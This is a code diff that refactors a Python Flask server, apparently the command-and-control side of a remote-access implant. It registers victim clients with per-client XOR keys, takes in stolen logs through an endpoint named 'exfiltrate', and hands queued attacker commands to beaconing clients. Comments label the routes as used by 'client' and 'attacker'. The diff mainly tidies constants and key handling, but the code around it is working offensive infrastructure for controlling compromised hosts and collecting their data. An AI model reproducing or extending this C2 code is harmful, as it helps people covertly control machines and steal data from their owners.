@@ -6,12 +6,13 @@ import os
 
 app = Flask(__name__)
 
-PLAIN_TEXT = {'Content-Type': 'text/plain'} 
+PLAIN_TEXT =   {'Content-Type': 'text/plain'}
+BYTES_FORMAT = {'Content-Type': 'application/octet-stream'}
 MAX_ACTIVE_TIME_BETWEEN_BEACON = 45
 
 class Cli():
     def __init__(self, id: str, os: str, arch: str, time_s: str, enc_key: bytes):
-        self.id = id; 
+        self.id = id
         self.os_ = os
         self.arch = arch
         self.enc_key = enc_key
@@ -56,7 +57,7 @@ def register():
     print(f'\n\nKEY: {enc_key.hex()}\n\n') # .hex()
 
     clients[id] = Cli(id, os_, arch, time_s, enc_key)
-    return Response(enc_key, status=200, content_type='application/octet-stream')
+    return Response(enc_key, status=200, content_type=BYTES_FORMAT)
 
 
 # TARGETED BY: client
@@ -65,13 +66,13 @@ def register():
 @app.route('/logs/<cid>', methods=['POST'])
 def exfiltrate(cid):
     if cid not in clients.keys():
-        return 'UNKNOWN CLI', 400, PLAIN_TEXT
+        return '', 400
 
     log = request.get_data(as_text=False) # we want bytes not text!
-    log = decode(log, clients[cid])  # decode the encoded logs
+    log = decode(log, clients[cid].enc_key)  # decode the encoded logs
 
     clients[cid].add_log(log)
-    return 'OK', 200, PLAIN_TEXT
+    return '', 200
 
 
 # TARGETED BY: client
@@ -82,7 +83,7 @@ def get_commands():
     '''
     cid = request.args.get('cid')
     if cid not in clients.keys():
-        return 'ERR', 400, PLAIN_TEXT
+        return '', 400
 
     # retieve client and update beacon information
     client = clients[cid]
@@ -91,12 +92,12 @@ def get_commands():
 
     # if there are no commands to execute return nothing
     if len(client.commands) == 0:
-        return '', 200, PLAIN_TEXT
+        return '', 200
 
     encoded_commands = encode_commands(client)
     client.commands = []  # clear command log
     
-    return Response(encoded_commands, status=200, content_type='application/octet-stream')
+    return Response(encoded_commands, status=200, content_type=BYTES_FORMAT)
 
 
 # TARGETED BY: attacker
@@ -139,7 +140,7 @@ def encode_commands(client: Cli) -> bytes:
     cmds_bytes = bytearray()
     num_cmds = len(client.commands)
     for i, cmd in enumerate(client.commands):
-        cmds_bytes.extend(encode(cmd, client))
+        cmds_bytes.extend(encode(cmd, client.enc_key))
         if i < num_cmds - 1:
             cmds_bytes.append(0x0A) # add a newline character
     return bytes(cmds_bytes)
@@ -151,17 +152,17 @@ def rotate_right(ch):
     '''
     return ((ch >> 1) | (ch << (8 - 1))) & 0xFF
 
-def encode(msg: str, cli: Cli) -> bytes:
+def encode(msg: str, key: bytes) -> bytes:
     ' Encode the message '
-    return asym_xor(msg.encode('utf-8'), cli)
+    return asym_xor(msg.encode('utf-8'), key)
 
-def decode(msg: bytes, cli: Cli) -> str:
+def decode(msg: bytes, key: bytes) -> str:
     ' Decodes and encoded message '
-    return asym_xor(msg, cli).decode('utf-8')
+    return asym_xor(msg, key).decode('utf-8')
 
-def asym_xor(s: bytes, cli: Cli) -> bytes:
+def asym_xor(s: bytes, key: bytes) -> bytes:
     ' symetric encoding helper function '
-    key = cli.enc_key[0]
+    key = key[0]
     result = bytearray()
 
     for byte in s:
